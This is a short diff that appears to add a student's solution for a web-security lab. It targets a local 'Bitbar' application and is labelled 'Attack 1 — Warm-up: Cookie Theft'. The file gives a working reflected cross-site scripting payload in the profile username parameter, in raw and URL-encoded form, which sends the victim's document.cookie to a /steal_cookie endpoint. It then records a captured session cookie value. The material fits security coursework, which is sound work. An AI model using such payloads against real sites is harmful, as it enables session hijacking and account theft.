@@ -1,0 +1,13 @@
+Attack 1 — Warm-up: Cookie Theft
+
+直接把未编码的脚本粘到浏览器地址栏（评分员已以 user1 登录时打开）：
+http://localhost:3000/profile?username=<script>new Image().src='/steal_cookie?cookie='+encodeURIComponent(document.cookie)</script>
+
+在需要 URL 编码的环境（或避免 + 被解码为空格）请使用 %2B 代替 +（这是可靠的 URL-encoded 版本）：
+http://localhost:3000/profile?username=%3Cscript%3Enew%20Image%28%29.src%3D%27%2Fsteal_cookie%3Fcookie%3D%27%2BencodeURIComponent%28document.cookie%29%3C%2Fscript%3E
+
+
+stolen_cookie(页面显示的前64位): _bitbar_session=BAh7CUkiD3Nlc3Npb25faWQGOgZFVEkiJTRjOTE5YWViMmUx
+
+完整的cookie：BAh7CUkiD3Nlc3Npb25faWQGOgZFVEkiJTRjOTE5YWViMmUxNDA4NzRlZDdmZDE2N2ZkNTY2MjQyBjsAVEkiCnRva2VuBjsARkkiG2JpRW9teFh5WTRLZ1dFUzVheEViTWcGOwBGSSIRbG9nZ2VkX2luX2lkBjsARmkGSSISc3RvbGVuX2Nvb2tpZQY7AEZJIkVfYml0YmFyX3Nlc3Npb249QkFoN0NFa2lEM05sYzNOcGIyNWZhV1FHT2daRlZFa2lKVFJqT1RFNVlXVmlNbVV4BjsAVA%3D%3D--c4aaf9b0dd29cdfc3cf8c499994d628f455589b1
+
